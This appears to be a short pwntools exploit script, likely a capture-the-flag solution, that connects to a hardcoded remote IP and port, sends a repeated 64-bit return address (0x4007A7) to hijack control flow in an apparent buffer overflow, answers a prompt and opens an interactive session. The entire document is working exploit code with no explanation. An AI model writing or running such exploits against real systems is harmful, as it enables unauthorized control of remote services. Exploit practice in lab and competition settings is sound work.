from pwn import *

p = remote("222.110.147.52", 42632)

print(p.recv())

p.sendline(p64(0x4007A7) * 5)

print(p.recv())

p.send("Y")

p.interactive()
